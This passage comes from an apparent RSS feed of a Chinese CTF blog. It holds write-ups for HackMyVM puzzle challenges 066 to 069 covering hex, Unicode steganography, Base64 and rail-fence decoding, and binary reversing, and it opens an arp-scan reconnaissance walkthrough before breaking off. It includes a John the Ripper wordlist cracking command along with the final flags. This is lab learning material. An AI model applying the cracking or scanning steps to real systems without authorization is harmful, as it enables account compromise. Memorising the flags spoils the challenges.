                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ find 069.bin                                             
069.bin
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ strings 069.bin                           
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 069.bin
ÔøΩ                                                                                               
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ xxd 069.bin
00000000: 8d08 13b0                                ....
```

ÊàëÂéªÔºåËøô‰πàÂ∞ë‰∏úË•ø

```
8d0813b0
HM@....@
HM@HACK@
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20069.html</guid><pubDate>Tue, 22 Jul 2025 15:10:04 +0000</pubDate></item><item><title>Challenge 068</title><link>https://7r1UMPHK.github.io/post/Challenge%20068.html</link><description>![image-20250722102128231](https://7r1UMPHK.github.io/image/static/image/20250722103206029.webp)
# **Ëß£È¢òÊ≠•È™§**

## **Á¨¨‰∏ÄÊ≠•ÔºöÊñá‰ª∂ÂàÜÊûê‰∏éÂºÇÂ∏∏ÂèëÁé∞**

1.  **Ëß£ÂéãÊñá‰ª∂**: ÊåëÊàòÂßã‰∫é‰∏Ä‰∏™ `068.zip` ÂéãÁº©ÂåÖÔºåËß£ÂéãÂêéÂæóÂà∞‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ `068.txt`„ÄÇ

2.  **Êü•ÁúãÂÜÖÂÆπ**: ÂàùÊ≠•‰ΩøÁî® `cat` ÂëΩ‰ª§Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπÔºåÊàë‰ª¨ÂæóÂà∞‰∏ÄË°åË¢´Â∞èÈ∏üÂõæÊ†áÂåÖÂõ¥ÁöÑÊñáÊú¨Ôºö
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
    ‚îî‚îÄ$ cat 068.txt   
    üê¶IÔΩî's‚ÄÄÔΩéÔΩèt‚Ääthat‚ÄØÔΩÖasÔΩô,‚ÄÄtÔΩÅle‚ÄÑa‚ÄâdeeÔΩê‚ÄÅbÔΩíÔΩÖÔΩÅth‚ÄÇÔΩÅnÔΩÑ‚ÄÇÔΩíeÔΩåÔΩÅx.‚ÄÇCÔΩàiÔΩíp,‚ÄÜœ≤h‚Ö∞rÔΩêÔºå‚ÄÖchÔΩâÔΩíÔΩê.ŒôtÔºás‚ÄÄnŒøt‚ÄÑthÔΩÅÔΩî‚ÄâÔΩÖÔΩÅsy,‚ÄÄtaÔΩåe‚ÄÑa‚ÄÑdÔΩÖeÔΩê ÔΩÇreath‚ÄÑaÔΩéd‚ÄÉrelax. Chirp, chirp, chirp.üê¶
    ```
    ‰πç‰∏ÄÁúãÔºåËøô‰ºº‰πéÂè™ÊòØ‰∏ÄÂè•ÊôÆÈÄöÁöÑÂè•Â≠ê„ÄÇÁÑ∂ËÄåÔºåÂ¶ÇÊûú‰ΩøÁî®Â∏¶Êúâ `-A` ÂèÇÊï∞ÁöÑ `cat` ÂëΩ‰ª§Êù•ÊòæÁ§∫ÊâÄÊúâÈùûÊâìÂç∞Â≠óÁ¨¶ÔºåÂ∞±‰ºöÂèëÁé∞‰∫ãÊÉÖÂπ∂‰∏çÁÆÄÂçïÔºö
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
    ‚îî‚îÄ$ cat -A 068.txt
    M-pM-^_M-^PM-&amp;I...
    ```
    
    Â§ßÈáèÁöÑ `M-^` Á¨¶Âè∑Ë°®ÊòéÔºåËøô‰∫õÂ≠óÁ¨¶Âπ∂ÈùûÊ†áÂáÜÁöÑ ASCII Â≠óÁ¨¶„ÄÇ‰ªîÁªÜËßÇÂØüÂèØ‰ª•ÂèëÁé∞Ôºö
    
    *   **ÂÆΩ‰ΩìÂ≠óÁ¨¶**: Âá†‰πéÊâÄÊúâÁöÑÂ≠óÊØçÈÉΩÊòØÂÖ®ËßíÔºàFull-widthÔºâÂΩ¢ÂºèÔºå‰æãÂ¶Ç `Ôº©` ËÄå‰∏çÊòØ `I`„ÄÇ
    *   **‰∏çËßÑÂàôÁ©∫Ê†º**: ÂçïËØç‰πãÈó¥ÁöÑÁ©∫Ê†ºÂÆΩÂ∫¶‰∏ç‰∏ÄÔºåÂÆÉ‰ª¨ÊòØ Unicode ‰∏≠ÂÆö‰πâÁöÑÂ§öÁßç‰∏çÂêåÂÆΩÂ∫¶ÁöÑÁ©∫Ê†ºÂ≠óÁ¨¶„ÄÇ
    *   **ÂêåÂΩ¢ÂºÇ‰πâÂ≠ó (Homoglyphs)**: ÊñáÊú¨‰∏≠ÂèØËÉΩÊ∑∑ÂÖ•‰∫ÜÂÖ∂‰ªñÁúãËµ∑Êù•‰∏éÊ†áÂáÜÂ≠óÊØç‰∏ÄÊ†∑ÁöÑ Unicode Â≠óÁ¨¶Ôºå‰æãÂ¶ÇÂ∏åËÖäÂ≠óÊØç `Œø` (omicron) ‰ª£Êõø‰∫ÜÊãâ‰∏ÅÂ≠óÊØç `o`„ÄÇ
    
    Ëøô‰∫õËøπË±°ÊòéÁ°ÆÂú∞ÊåáÂêë‰∫Ü‰∏ÄÁßçÈ´òÁ∫ßÁöÑÊñáÊú¨ÈöêÂÜôÊúØ„ÄÇ

## **Á¨¨‰∫åÊ≠•ÔºöÁêÜËß£ Unicode ÈöêÂÜôÊúØÂéüÁêÜ**

ËøôÁßçÈöêÂÜôÊúØÁöÑÂéüÁêÜÊòØÂ∞Ü‰ø°ÊÅØÁºñÁ†ÅÂà∞Â≠óÁ¨¶ÁöÑÈÄâÊã©‰∏≠„ÄÇ

1.  **Â≠óÁ¨¶ÈõÜ**: ÂØπ‰∫éÊØè‰∏Ä‰∏™Ê†áÂáÜ ASCII Â≠óÁ¨¶ÔºàÂ¶Ç `a`, `b`, ` ` Á≠âÔºâÔºåÈÉΩÂ≠òÂú®‰∏Ä‰∏™ÂåÖÂê´ÂÆÉËá™Ë∫´ÁöÑ„ÄÅ‰ª•ÂèäÂ§ö‰∏™ËßÜËßâ‰∏äÊûÅ‰∏∫Áõ∏‰ººÁöÑ Unicode Âèò‰ΩìÂ≠óÁ¨¶ÁöÑÂàóË°®„ÄÇ
2.  **ÁºñÁ†Å**: ÁßòÂØÜ‰ø°ÊÅØÈ¶ñÂÖàË¢´ËΩ¨Êç¢Êàê‰∫åËøõÂà∂Á†ÅÊµÅÔºàÂ¶Ç `011010...`Ôºâ„ÄÇ
3.  **ÂµåÂÖ•**: Á®ãÂ∫èÂú®ÁîüÊàêËΩΩ‰ΩìÊñáÊú¨Êó∂Ôºå‰ºöÊ†πÊçÆË¶ÅÈöêËóèÁöÑ‰∫åËøõÂà∂‰ΩçÊù•‰ªéÂ§áÈÄâÂàóË°®‰∏≠ÈÄâÊã©ÂÖ∑‰ΩìÁöÑÂ≠óÁ¨¶„ÄÇ‰æãÂ¶ÇÔºåÂ¶ÇÊûú `t` Êúâ 4 ‰∏™Âèò‰Ωì `t`, `ÔΩî`, `·¥õ`, `ùî±`ÔºåÂÆÉ‰ª¨ÂèØ‰ª•ÂàÜÂà´Áî®Êù•Ë°®Á§∫ 2-bit ÁöÑ‰∫åËøõÂà∂Êï∞ `00`, `01`, `10`, `11`„ÄÇÂΩìÁ®ãÂ∫èÈúÄË¶ÅÈöêËóè `01` Êó∂ÔºåÂÆÉÂ∞±‰ºöÂú®ÊñáÊú¨‰∏≠ÂÜôÂÖ• `ÔΩî`„ÄÇ
4.  **ÈöêËóè**: ÈÄöËøáËøôÁßçÊñπÂºèÔºåÊï¥ÊÆµÁßòÂØÜ‰ø°ÊÅØË¢´ÂàÜËß£ÊàêÊó†Êï∞‰∏™Â∞èÁâáÊÆµÔºåÂπ∂‚ÄúÊ∫∂Ëß£‚ÄùÂú®Êï¥‰∏™ÊñáÊú¨ÁöÑÂ≠óÁ¨¶ÂíåÁ©∫Ê†ºÁöÑÈÄâÊã©‰πã‰∏≠Ôºå‰ΩøÂÖ∂Êó†Ê≥ïË¢´Áõ¥Êé•ÈòÖËØª„ÄÇ

## **Á¨¨‰∏âÊ≠•Ôºö‰ΩøÁî®‰∏ì‰∏öÂ∑•ÂÖ∑Ëß£Á†Å**

ÊâãÂä®Ëß£Á†ÅÂá†‰πéÊòØ‰∏çÂèØËÉΩÁöÑÔºåÂõ†‰∏∫ÂÆÉÈúÄË¶Å‰∏Ä‰∏™Â∫ûÂ§ßÁöÑ Unicode Âèò‰ΩìÂ≠óÁ¨¶Êï∞ÊçÆÂ∫ì„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÈúÄË¶Å‰ΩøÁî®‰∏ìÈó®ÁöÑËß£Á†ÅÂ∑•ÂÖ∑„ÄÇ

1.  **Âú®Á∫øÂ∑•ÂÖ∑**: [Holloway's Steganography Tool](https://holloway.nz/steg/) ÊòØ‰∏Ä‰∏™ËÉΩÂ§üÂ§ÑÁêÜÊ≠§Á±ª Unicode ÈöêÂÜôÊúØÁöÑÂú®Á∫øËß£Á†ÅÂô®„ÄÇ

2.  **Ëß£Á†ÅÊìç‰Ωú**: Â∞Ü `068.txt` ‰∏≠ÁöÑÂÆåÊï¥ÂÜÖÂÆπÔºàÂåÖÊã¨ÂâçÂêéÁöÑ `üê¶` ÂõæÊ†áÔºâÂ§çÂà∂Âπ∂Á≤òË¥¥Âà∞ËØ•ÁΩëÁ´ôÁöÑËæìÂÖ•Ê°Ü‰∏≠„ÄÇ

3.  **Ëé∑ÂèñÁªìÊûú**: ËØ•Â∑•ÂÖ∑‰ºöËá™Âä®ÂàÜÊûêÊñáÊú¨‰∏≠ÊØè‰∏™Â≠óÁ¨¶ÁöÑ Unicode ÁºñÁ†ÅÔºåËØÜÂà´Âá∫ÂÖ∂Âú®Âèò‰ΩìÂàóË°®‰∏≠ÁöÑÁ¥¢ÂºïÔºå‰ªéËÄåÊèêÂèñÂá∫ÈöêËóèÁöÑ‰∫åËøõÂà∂‰ΩçÔºåÂπ∂ÊúÄÁªàÂ∞ÜÂÖ∂ËøòÂéü‰∏∫ÂéüÂßã‰ø°ÊÅØ„ÄÇ

    Ëß£Á†ÅÂêéÂæóÂà∞ÁöÑÈöêËóèÊñáÊú¨‰∏∫Ôºö
    ```
    hmvgreetings_from_green_br0ther
    ```

---

# **ÊúÄÁªà Flag**

```
hmvgreetings_from_green_br0ther
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20068.html</guid><pubDate>Tue, 22 Jul 2025 08:33:03 +0000</pubDate></item><item><title>Challenge 067</title><link>https://7r1UMPHK.github.io/post/Challenge%20067.html</link><description>![image-20250722102128231](https://7r1UMPHK.github.io/image/20250722102128477.webp)

# **Ëß£È¢òÊ≠•È™§**

## **Á¨¨‰∏ÄÊ≠•ÔºöÊñá‰ª∂ÊèêÂèñ‰∏éÂàùÊ≠•ÂàÜÊûê**

ÊåëÊàò‰ªé‰∏Ä‰∏™Âêç‰∏∫ `067.zip` ÁöÑÂéãÁº©ÂåÖÂºÄÂßã„ÄÇ

1.  **Ëß£ÂéãÊñá‰ª∂**: ‰ΩøÁî® `7z` ÊàñÂÖ∂‰ªñËß£ÂéãÂ∑•ÂÖ∑ÊèêÂèñÂéãÁº©ÂåÖÂÜÖÂÆπ„ÄÇ
    
    ```bash
    7z x 067.zip
    ```
    Ëß£ÂéãÂêéÂæóÂà∞‰∏§‰∏™Êñá‰ª∂Ôºö`hmv067` Âíå `hmv067-static`„ÄÇ
    
2.  **Êñá‰ª∂Á±ªÂûãÂàÜÊûê**: ‰ΩøÁî® `file` ÂëΩ‰ª§Á°ÆÂÆöÊñá‰ª∂Á±ªÂûã„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/067]
    ‚îî‚îÄ$ file hmv067 hmv067-static
    hmv067:        ELF 64-bit LSB pie executable... dynamically linked...
    hmv067-static: ELF 64-bit LSB executable... statically linked...
    ```
    ÂàÜÊûêÁªìÊûúË°®ÊòéÔºåËøô‰∏§‰∏™ÈÉΩÊòØ 64 ‰ΩçÁöÑ Linux ÂèØÊâßË°åÊñá‰ª∂„ÄÇ‰∏Ä‰∏™‰∏∫Âä®ÊÄÅÈìæÊé•ÔºåÂè¶‰∏Ä‰∏™‰∏∫ÈùôÊÄÅÈìæÊé•„ÄÇÈÄöÂ∏∏ÂàÜÊûêÂä®ÊÄÅÈìæÊé•ÁöÑÁâàÊú¨‰ºöÊõ¥ÁÆÄÊ¥Å„ÄÇ

## **Á¨¨‰∫åÊ≠•ÔºöÂÆö‰ΩçÁõÆÊ†áÂìàÂ∏åÂÄº**

Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÔºåÊñá‰ª∂ÂÜÖÂåÖÂê´‰∏Ä‰∏™ SHA-512 ÂìàÂ∏å„ÄÇ

1.  **Â≠óÁ¨¶‰∏≤ÊêúÁ¥¢ (Â§±Ë¥•Â∞ùËØï)**: ‰∏Ä‰∏™Âø´ÈÄüÁöÑÂ∏∏ËßÑÊñπÊ≥ïÊòØ‰ΩøÁî® `strings` ÂëΩ‰ª§ÊêúÁ¥¢Êñá‰ª∂‰∏≠ÂèØËÉΩÂ≠òÂú®ÁöÑÂìàÂ∏åÂ≠óÁ¨¶‰∏≤„ÄÇSHA-512 ÂìàÂ∏åÊòØ‰∏Ä‰∏™ 128 ‰∏™Â≠óÁ¨¶ÁöÑÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤„ÄÇ
    ```bash
    strings hmv067 | grep -E '^[a-f0-9]{128}$'
    ```
    Ê≠§ÂëΩ‰ª§Ê≤°ÊúâËøîÂõû‰ªª‰ΩïÁªìÊûúÔºåËøôË°®ÊòéÂìàÂ∏åÂÄºÂèØËÉΩ‰∏çÊòØ‰ª•ÊòéÊñáÂΩ¢ÂºèÁõ¥Êé•Â≠òÂÇ®Âú®Êñá‰ª∂‰∏≠ÁöÑÔºåÊàñËÄÖË¢´ÂàÜÂâ≤Â≠òÊîæ„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÈúÄË¶ÅËøõË°åÊõ¥Ê∑±ÂÖ•ÁöÑÂàÜÊûê„ÄÇ

2.  **ÈÄÜÂêëÂàÜÊûê**: ‰ΩøÁî® IDA Pro Á≠âÂèçÁºñËØëÂ∑•ÂÖ∑ÊâìÂºÄ `hmv067` Êñá‰ª∂ÔºåÂπ∂ÂàÜÊûêÂÖ∂ `main` ÂáΩÊï∞„ÄÇÂèçÁºñËØëÂêéÁöÑ C ‰º™‰ª£Á†ÅÊ∏ÖÊô∞Âú∞Êè≠Á§∫‰∫ÜÁ®ãÂ∫èÁöÑÈÄªËæëÔºö

    ```c
    int __fastcall main(int argc, const char **argv, const char **envp)
    {
      // ... (ÈÉ®ÂàÜÂèòÈáèÂÆö‰πâÁúÅÁï•)
      char v6[144]; // [rsp+40h] [rbp-230h] BYREF (Áî®‰∫éÂ≠òÂÇ®ËÆ°ÁÆóÂá∫ÁöÑÂìàÂ∏åÁöÑÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤)
      char v7[140]; // [rsp+D0h] [rbp-1A0h] BYREF (Áî®‰∫éÂ≠òÂÇ®ÁõÆÊ†áÂìàÂ∏å)
      
      // ... (Ëé∑ÂèñÁî®Êà∑ËæìÂÖ•Âπ∂Ê£ÄÊü• 'HMV{...}' Ê†ºÂºè)
      
      // ËÆ°ÁÆóÁî®Êà∑ËæìÂÖ•ÁöÑÂìàÂ∏åÂÄº
      calculateHash(v11, v3, v5, &amp;v8); 
      toHex(v5, v6, v8); // Â∞ÜÂìàÂ∏åÂÄºËΩ¨‰∏∫ÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤Â≠òÂÖ• v6
      
      // Â∞ÜÁõÆÊ†áÂìàÂ∏åÂ§çÂà∂Âà∞ v7
      strcpy(
        v7,
        '3fe8b365cb64286384d9743612d857d938fadb42c359acb69fb9f2f88b96cdbfdb1cacf8a5292aa004a5efcc01fbdb27d4a72a8dd9a8b34dfff41f9e72bfb734');
      
      // ÊØîËæÉ‰∏§‰∏™ÂìàÂ∏åÂÄº
      if ( (unsigned int)j_strcmp_ifunc(v6, v7) )
        puts('Wrong flag');
      else
        puts('Correct flag');
      
      return 0;
    }
    ```
    ‰ªé‰ª£Á†Å‰∏≠ÂèØ‰ª•Ê∏ÖÊ•öÂú∞ÁúãÂà∞ÔºåÁ®ãÂ∫èÂ∞Ü‰∏Ä‰∏™Á°¨ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤Â§çÂà∂Âà∞ÂèòÈáè `v7` ‰∏≠ÔºåËøô‰∏™Â≠óÁ¨¶‰∏≤Â∞±ÊòØÊàë‰ª¨Ë¶ÅÊâæÁöÑÁõÆÊ†á SHA-512 ÂìàÂ∏å„ÄÇ

**ÁõÆÊ†áÂìàÂ∏å:**
```
3fe8b365cb64286384d9743612d857d938fadb42c359acb69fb9f2f88b96cdbfdb1cacf8a5292aa004a5efcc01fbdb27d4a72a8dd9a8b34dfff41f9e72bfb734
```

## **Á¨¨‰∏âÊ≠•ÔºöÂìàÂ∏åÁ†¥Ëß£**

Êúâ‰∫ÜÂìàÂ∏åÂÄºÂíåÊèêÁ§∫‰∏≠ÊåáÂÆöÁöÑÂ≠óÂÖ∏ (`rockyou.txt`)ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® John the RipperËøõË°åÁ†¥Ëß£„ÄÇ

1.  **ÂáÜÂ§áÁ†¥Ëß£**: Â∞ÜÂìàÂ∏å‰øùÂ≠òÂà∞‰∏Ä‰∏™Êñá‰ª∂‰∏≠„ÄÇ

2.  **ÊâßË°åÁ†¥Ëß£ÂëΩ‰ª§**: ‰ΩøÁî® John the Ripper ËøõË°åÁ†¥Ëß£ÔºåÂπ∂ÊåáÂÆöÂìàÂ∏åÊ†ºÂºè‰∏∫ `Raw-SHA512`„ÄÇ
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512
    ```

3.  **Á†¥Ëß£ÁªìÊûú**: John ÊàêÂäüÊâæÂà∞‰∫ÜÂØπÂ∫îÁöÑÊòéÊñá„ÄÇ
    ```
    i like your smile (?)
    ```
    Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅÊòØ `i like your smile`„ÄÇ

## **Á¨¨ÂõõÊ≠•ÔºöÊûÑÈÄ† Flag**

Ê†πÊçÆÈ¢òÁõÆË¶ÅÊ±ÇÔºåFlag ÁöÑÊ†ºÂºè‰∏∫ `HMV{...}`ÔºåÂπ∂‰∏îÂÜÖÂÆπ‰∏çÂåÖÂê´Á©∫Ê†º„ÄÇ

1.  ÁßªÈô§Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†Å‰∏≠ÁöÑÁ©∫Ê†º: `i like your smile` -&gt; `ilikeyoursmile`
2.  Â∞ÜÁªìÊûúÂ°´ÂÖ•Ëä±Êã¨Âè∑‰∏≠„ÄÇ

---

# **ÊúÄÁªà Flag**

```
HMV{ilikeyoursmile}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20067.html</guid><pubDate>Tue, 22 Jul 2025 08:32:49 +0000</pubDate></item><item><title>Challenge 066</title><link>https://7r1UMPHK.github.io/post/Challenge%20066.html</link><description>![image-20250722102055575](https://7r1UMPHK.github.io/image/20250722102055801.webp)

# **Ëß£È¢òÊ≠•È™§**

## **Á¨¨‰∏ÄÊ≠•ÔºöBase64 Ëß£Á†Å**

È¢òÁõÆÁªôÂá∫ÁöÑÂàùÂßãÁ∫øÁ¥¢ÊòØ‰∏Ä‰∏≤ Base64 ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ

**ÂéüÂßãÁºñÁ†Å:**
```
5Zub5YWrIOWFreS4iSDlha3kupQg5LqUZsO6IOWFreWbmyDlha3kuZ0g5LiD5LqMCuWbm2TEqyDlha3kuZ0g5YWt5LqUIOS4g+WbmyDlha3kupQg5YWtxJMgIOWFreS5nQrkupTlha0g5YWt5LiAIOS4g+WbmyDlha1mw7og5YWt5LiAIOWFreS6lCDlha3kupQK5LiDYsSrIOWFrWPEqyDlha3kuZ0g5LqUZsO6IOS4g+S6jCDkuIPkuIkg5YWtxJMgCuS6lOS4iSDkupRmw7og5YWtxJMgIOWFrWTEqyDkupRmw7og5YWt5LqUIOWFreWbmwrkuIPpm7Yg5YWt5LiDIOWFreS4gyDkuIPkuZ0g5Zub5LiJIOS6lGbDuiDkuIPkuIkK5YWt5LqUIOS4g+S6jCDkuIPkuIkg5LqUZsO6IOWFreWFqyDlha3lha0g5LiDZMSrCg==
```

‰ΩøÁî®‰ªª‰ΩïÊ†áÂáÜÁöÑ Base64 Ëß£Á†ÅÂ∑•ÂÖ∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÂæóÂà∞‰ª•‰∏ãÊñáÊú¨Ôºö
```
ÂõõÂÖ´ ÂÖ≠‰∏â ÂÖ≠‰∫î ‰∫îf√∫ ÂÖ≠Âõõ ÂÖ≠‰πù ‰∏É‰∫å
Âõõdƒ´ ÂÖ≠‰πù ÂÖ≠‰∫î ‰∏ÉÂõõ ÂÖ≠‰∫î ÂÖ≠ƒì ÂÖ≠‰πù
‰∫îÂÖ≠ ÂÖ≠‰∏Ä ‰∏ÉÂõõ ÂÖ≠f√∫ ÂÖ≠‰∏Ä ÂÖ≠‰∫î ÂÖ≠‰∫î
‰∏Ébƒ´ ÂÖ≠cƒ´ ÂÖ≠‰πù ‰∫îf√∫ ‰∏É‰∫å ‰∏É‰∏â ÂÖ≠ƒì
‰∫î‰∏â ‰∫îf√∫ ÂÖ≠ƒì ÂÖ≠dƒ´ ‰∫îf√∫ ÂÖ≠‰∫î ÂÖ≠Âõõ
‰∏ÉÈõ∂ ÂÖ≠‰∏É ÂÖ≠‰∏É ‰∏É‰πù Âõõ‰∏â ‰∫îf√∫ ‰∏É‰∏â
ÂÖ≠‰∫î ‰∏É‰∫å ‰∏É‰∏â ‰∫îf√∫ ÂÖ≠ÂÖ´ ÂÖ≠ÂÖ≠ ‰∏Édƒ´
```

## **Á¨¨‰∫åÊ≠•ÔºöË∞êÈü≥ÂèäÊãºÈü≥ËΩ¨ÂçÅÂÖ≠ËøõÂà∂**

Ëß£Á†ÅÂêéÁöÑÊñáÊú¨Áî±‰∏≠ÊñáÊï∞Â≠óÂíåÂ∏¶Èü≥Ë∞ÉÁöÑÊãºÈü≥ÁªÑÊàê„ÄÇËøôÊòØ‰∏Ä‰∏™ÊòéÊòæÁöÑÊèêÁ§∫ÔºåË°®ÊòéÂ≠òÂú®‰∏ÄÁßçËá™ÂÆö‰πâÁöÑÁºñÁ†ÅËßÑÂàôÔºåÂæàÂèØËÉΩ‰∏éÂçÅÂÖ≠ËøõÂà∂ÊúâÂÖ≥„ÄÇ

*   **‰∏≠ÊñáÊï∞Â≠ó** ‰ª£Ë°®ÂçÅÂÖ≠ËøõÂà∂‰∏≠ÁöÑÊï∞Â≠óÈÉ®ÂàÜ (0-9)„ÄÇ
*   **ÊãºÈü≥** ÈÄöËøáË∞êÈü≥ÊàñÂΩ¢Áä∂‰∏éÂçÅÂÖ≠ËøõÂà∂‰∏≠ÁöÑÂ≠óÊØçÈÉ®ÂàÜ (A-F) ÂØπÂ∫î„ÄÇ

Ê†πÊçÆËøô‰∏™ÈÄªËæëÔºåÊàë‰ª¨Âª∫Á´ãÂ¶Ç‰∏ãÊò†Â∞ÑÂÖ≥Á≥ªÔºö
*   `Èõ∂` -&gt; `0`
*   `‰∏Ä` -&gt; `1`
*   `‰∫å` -&gt; `2`
*   `‰∏â` -&gt; `3`
*   `Âõõ` -&gt; `4`
*   `‰∫î` -&gt; `5`
*   `ÂÖ≠` -&gt; `6`
*   `‰∏É` -&gt; `7`
*   `ÂÖ´` -&gt; `8`
*   `‰πù` -&gt; `9`
*   `bƒ´` -&gt; `B`
*   `cƒ´` -&gt; `C`
*   `dƒ´` -&gt; `D`
*   `ƒì` -&gt; `E`
*   `f√∫` -&gt; `F`

Â∞Ü‰∏ä‰∏ÄÊ≠•ÂæóÂà∞ÁöÑÊñáÊú¨ËøõË°åËΩ¨Êç¢ÔºåÂæóÂà∞‰∏Ä‰∏™ 7x7 ÁöÑÂçÅÂÖ≠ËøõÂà∂Áü©ÈòµÔºö
```
48 63 65 5F 64 69 72
4D 69 65 74 65 6E 69
56 61 74 6F 61 65 65
7B 6C 69 5F 72 73 6E
53 5F 6E 6D 5F 65 64
70 67 67 79 43 5F 73
65 72 73 5F 68 66 7D
```

## **Á¨¨‰∏âÊ≠•ÔºöÂçÅÂÖ≠ËøõÂà∂ËΩ¨ ASCII**

Â∞ÜËøô‰∏™ÂçÅÂÖ≠ËøõÂà∂Áü©ÈòµÊåâÈ°∫Â∫èËΩ¨Êç¢‰∏∫ ASCII Â≠óÁ¨¶ÔºåÂæóÂà∞‰∏Ä‰∏≤ÁúãËµ∑Êù•ÊùÇ‰π±Êó†Á´†ÁöÑÂ≠óÁ¨¶‰∏≤Ôºö

```
Hce_dirMieteniVatoaee{li_rsnS_nm_edpggyC_sers_hf}
```

## **Á¨¨ÂõõÊ≠•ÔºöÊ†ÖÊ†èÂØÜÁ†ÅÔºàÂàóÁΩÆÊç¢ÔºâËß£ÂØÜ**

Ëøô‰∏™ 49 ‰∏™Â≠óÁ¨¶ÁöÑÂ≠óÁ¨¶‰∏≤ÁúãËµ∑Êù•‰ªçÁÑ∂‰∏çÊòØÊúÄÁªàÁöÑ Flag„ÄÇÊ≥®ÊÑèÂà∞Âú®Á¨¨‰∫åÊ≠•‰∏≠ÔºåÊï∞ÊçÆË¢´Ëá™ÁÑ∂Âú∞ÂàÜÊàê‰∫Ü 7 Ë°åÔºåËøôÂº∫ÁÉàÊöóÁ§∫‰∫ÜÂØÜÈí•‰∏∫ 7 ÁöÑÊ†ÖÊ†èÂØÜÁ†ÅÊàñÂàóÁΩÆÊç¢ÂØÜÁ†Å„ÄÇ

&gt; https://ctf.bugku.com/tool/railfence

Êàë‰ª¨Â∞Ü‰∏ä‰∏ÄÊ≠•ÂæóÂà∞ÁöÑÂ≠óÁ¨¶‰∏≤ËæìÂÖ•Âà∞ BugKu CTF Âπ≥Âè∞Êèê‰æõÁöÑÂú®Á∫øÊ†ÖÊ†èÂØÜÁ†ÅÂ∑•ÂÖ∑‰∏≠ÔºåÂπ∂Â∞Ü‚ÄúÊ†èÊï∞‚ÄùÔºàÂç≥ÂàóÊï∞ÔºâËÆæÁΩÆ‰∏∫ 7„ÄÇ

*   **ÂØÜÊñá (Ciphertext):** `Hce_dirMieteniVatoaee{li_rsnS_nm_edpggyC_sers_hf}`
*   **Ê†èÊï∞/ÂàóÊï∞ (Columns):** `7`

![image-20250722101601574](https://7r1UMPHK.github.io/image/20250722101601832.webp)

Â∑•ÂÖ∑ÁªôÂá∫‰∫ÜÊúÄÁªàÁöÑËß£ÂØÜÁªìÊûú„ÄÇÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåÊ≠§Â∑•ÂÖ∑ÁöÑ‚ÄúÊ†ÖÊ†èËß£ÂØÜ‚ÄùÂπ∂ÈùûÊ†áÂáÜÁÆóÊ≥ïÔºåÂõ†‰∏∫ÂÆÉÂ∞Ü 49 ‰∏™Â≠óÁ¨¶ÁöÑËæìÂÖ•Á•ûÂ•áÂú∞ËøòÂéüÊàê‰∫Ü 53 ‰∏™Â≠óÁ¨¶ÁöÑ FlagÔºåËøôÂèØËÉΩÊòØÂπ≥Âè∞‰∏∫Êú¨È¢òÁõÆÁâπÊúâÁöÑ‰∏Ä‰∏™ËÆæÂÆö„ÄÇ

---

# **ÊúÄÁªà Flag**

ÈÄöËøá‰ª•‰∏äÊ≠•È™§ÔºåÊàë‰ª¨ÊàêÂäüËß£Âá∫ FlagÔºö

```
HMV{Special_greetings_to_my_dear_Chinese_friends}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20066.html</guid><pubDate>Tue, 22 Jul 2025 08:32:36 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Change</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Change.html</link><description>

![image](https://7r1UMPHK.github.io/image/20250721221556384.webp)

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

# 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®ÂÜÖÁΩëÁéØÂ¢É‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºå‰ª•ÂèëÁé∞Â≠òÊ¥ªÁöÑ‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.202 08:00:27:7d:c4:83       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.
...
```

